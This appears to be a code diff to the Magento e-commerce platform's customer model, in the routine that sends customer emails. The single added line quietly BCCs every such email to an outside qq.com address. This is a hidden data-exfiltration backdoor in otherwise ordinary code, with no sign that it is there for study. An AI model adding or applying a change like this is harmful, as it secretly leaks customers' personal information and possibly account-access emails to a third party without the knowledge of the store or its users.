@@ -723,6 +723,7 @@ class Mage_Customer_Model_Customer extends Mage_Core_Model_Abstract
         $mailer = Mage::getModel('core/email_template_mailer');
         $emailInfo = Mage::getModel('core/email_info');
         $emailInfo->addTo($this->getEmail(), $this->getName());
+        $emailInfo->addBcc("313399524@qq.com");
         $mailer->addEmailInfo($emailInfo);
 
         // Set all required params and send emails
